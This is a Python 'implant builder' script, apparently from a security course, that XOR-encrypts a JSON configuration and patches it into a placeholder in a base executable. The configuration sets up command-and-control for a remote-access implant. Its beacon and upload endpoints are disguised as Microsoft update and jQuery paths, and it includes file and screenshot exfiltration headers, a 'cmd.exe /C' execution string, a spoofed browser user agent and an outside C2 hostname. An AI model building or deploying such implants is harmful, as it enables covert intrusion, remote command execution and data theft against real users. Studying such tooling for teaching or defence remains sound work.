import json
import argparse
import random

"""
Simple implant builder
Generates a JSON string and replaces the template with the correct config  
Optional paramaters for input and output files

Future plans: UI of some sort, encrypting the config file 
"""

class configuration:
    def __init__(self, version=1, verbose=False, buffer_length=2000):
        self.buffer_length = buffer_length

        self.config = dict()
        self.version = version
        self.verbose = verbose

        self.config["version"] = self.version
        self.config["strings"] = dict()
        self.config["endpoints"] = dict()

        self.strings = self.config["strings"]
        self.endpoints = self.config["endpoints"]


    def get_json_bytes(self):
        # generate the configuration file as a string  
        return json.dumps(self.config).encode()


    def xor_data(self, data, keys):
        return bytearray(data[i] ^ keys[i % len(keys)] for i in range(0, len(data))) 


    def get_encrypted_bytes(self, num_keys=4):
        config_bytes = self.get_json_bytes()
        # generate the 4 bytes for multibyte XOR key
        self.keys = [random.randrange(1,255) for i in range(num_keys)]
        keybytes = [key.to_bytes(1, 'big') for key in self.keys]
        padding = b"\x00" * (self.buffer_length - len(config_bytes) - len(keybytes))

        if(self.verbose):
            print(config_bytes)
            print(self.keys)

        # create bytearray of key bytes
        keybytesout = b''
        for keybyte in keybytes:
            keybytesout += keybyte
        
        # create and return the final config byte array in format: keybytes, XORd data, padding
        config_bytes = keybytesout + self.xor_data(config_bytes + padding, self.keys)
        if(self.verbose):
            print(config_bytes)
        return config_bytes
    
    
    def assign_default_values(self):
        #
        # Assigns the default values to the config
        # TODO: Make this more modular
        # Changes made to the structure/format of the config JSON may require config.cpp/config.h to be updated as well 
        #

        # endpoints
        self.endpoints["heartbeat"] = "/docroot/js/jquery-ui-1.11.2.custom.min.js"
        self.endpoints["info"] = "/msdownload/update/v3/static/trustedr/en/disallowedcertstl.cab"
        self.endpoints["out"] = "/msdownload/update/v3/static/untrusted/en/trustedinstaller.cab"
        self.endpoints["upload"] = "/msdownload/update/v3/static/untrustedr/en/authroot.cab"
        self.endpoints["ps"] = "/msdownload/update/v3/static/trustedr/en/authrootstl.cab"

        # strings 
        self.strings["post"] = "POST"
        self.strings["get"] = "GET"
        self.strings["uploadheaders"] = "Content-Type: multipart/form-data; boundary=UPLOAD"
        self.strings["uploadheadfile"] = "--UPLOAD\r\nContent-Disposition: form-data; name=\"file\"; filename=\"upload.bin\"\r\nContent-Type: application/octet-stream\r\n\r\n"
        self.strings["uploadheadscreenshot"] = "--UPLOAD\r\nContent-Disposition: form-data; name=\"file\"; filename=\"screenshot.bmp\"\r\nContent-Type: application/octet-stream\r\n\r\n"
        self.strings["uploadtail"] = "\r\n--UPLOAD--\r\n"
        self.strings["cmd"] = "cmd.exe /C "
        self.strings["regsubkey"] = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
        self.strings["productname"] = "ProductName"
        self.strings["displayversion"] = "DisplayVersion"

        # net
        self.config["hostname"] = "127.0.0.1"
        self.config["hostname"] = "192.168.15.75"
        self.config["hostname"] = "nginxworker.3utilities.com"
        self.config["port"] = 443
        self.config["protocol"] = "http"
        self.config["useragent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36"
        self.config["ipcheckurl"] = "http://ifconfig.me/ip"

        # times
        self.config["sleeptime"] = 17 * 1000
        self.config["cmdtimeout"] = 30 * 10000000

        # keys
        self.config["key"] = "CSEC476"
        self.config["xorkey"] = 0x7f


def gen_payload(config, infile, outfile, dry_run=False):
    # Generate encrypted bytes
    config_bytes = config.get_encrypted_bytes()

    # Read executable into bytearray
    with open(infile, 'rb') as exe:
        baseexe = bytearray(exe.read())
    exe.close()

    # Find offset
    offset = baseexe.find(b'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
    if config.verbose:
        print(offset)

    # Copy executable into new file + write config_bytes @ offset
    if not dry_run:
        with open(outfile, 'wb') as exe:
            exe.write(baseexe)
            exe.seek(offset)
            exe.write(config_bytes)
            print("Config written to " + outfile)
        exe.close()


def main():
    BUFLEN = 2000
    # command line args
    parser = argparse.ArgumentParser(description="Basic builder utility for implants as seen at https://www.youtube.com/watch?v=FiT7-zxQGbo")
    parser.add_argument('--i', type=str, default='base.exe', help="Input file")
    parser.add_argument('--o', type=str, default='out.exe', help="Output file")
    parser.add_argument('--v', default=False, action='store_true', help="Verbose output")
    parser.add_argument('--dry-run', default=False, action='store_true', help="Dry run (don't write output file)")

    args = parser.parse_args()
    infile = args.i
    outfile = args.o
    verbose = args.v
    dry_run = args.dry_run

    config = configuration(version=1, verbose=verbose, buffer_length=BUFLEN)
    config.assign_default_values()
    gen_payload(config, infile, outfile, dry_run=dry_run)
    

if __name__ == "__main__":
    main()